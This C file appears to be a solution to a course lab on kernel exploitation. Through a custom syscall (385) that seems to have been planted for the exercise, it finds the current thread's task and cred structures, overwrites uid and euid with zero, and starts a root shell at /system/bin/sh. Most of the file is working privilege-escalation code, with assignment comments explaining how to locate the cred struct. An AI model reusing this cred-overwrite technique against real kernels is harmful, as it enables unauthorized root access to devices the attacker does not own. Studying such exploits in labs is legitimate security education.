#include <stdio.h>

int call(int arg1, int arg2) {
    return syscall(385, arg1, arg2);
}

void reset() {
    call(0,0);
}

void overwrite(int addr, int byteOffset) {
    for (int i = 1; i < 257; i++) {
        if (i == 256) {
            call(2, addr + byteOffset - 8);
        }
        call(1, i);
    }
}

void runExploit() {
    // First, locate thread info using provided system call. Check kernel source code.

    // Next, you need to find thread_info->task->cred
    //
    // There are three ways to do it:
    // 1.  Read kernel source code and compute the exact offset. 
    //     You will need to look at the .config file under kernel dir to resolve some macros
    // 2.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 3.  Scan from thread_info->task to find the location of cred field
    //     HINT: here are some conditions to help: 
    //         task->cpu_timers[i] >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->cpu_timers[i]->next == task->cpu_timers[i]->prev (Because we never set any cpu timer)
    //         task->cpu_timers[i]->next >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->real_cred == task->cred (Because we never used seteuid() system call)
    //         task->cred->uid == getuid()
    
    // Finally, you will need to rewrite the cred struct and give your process highest privilege

    
    // initialize
    reset();
    // insert 1 node
    call(1,1);

    // current thread info
    int thread_info = call(4, NULL);
    fprintf(stderr, "thread_info: %p\n", call(4, NULL));

    // obtain thread_info->task
    int task_addr = thread_info + 12;
    call(2, task_addr - 4);
    int task = call(3, NULL);

    fprintf(stderr, "task: %p\n", task);

    // obtain thread_info->task->cred
    int cred_addr = task + 732;
    call(2, cred_addr - 4);
    int cred = call(3, NULL);

    fprintf(stderr, "cred: %p\n", cred);

    // obtain thread_info->task->cred->uid
    int uid_addr = cred + 4; // uid is + 4
    int euid_addr = cred + 20; // euid is +20

    fprintf(stderr, "uid_addr: %p\n", uid_addr);

    // overwrite uid
    reset();
    for (int i = 0; i < 2; i++) {
        overwrite(uid_addr, i);
        reset();
    }

    for (int i = 0; i < 2; i++) {
        overwrite(euid_addr, i);
        reset();
    }

    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());

    // The exploit itself
    runExploit();

    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());

    if (getuid() == 0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/system/bin/sh", NULL};
        execv("/system/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
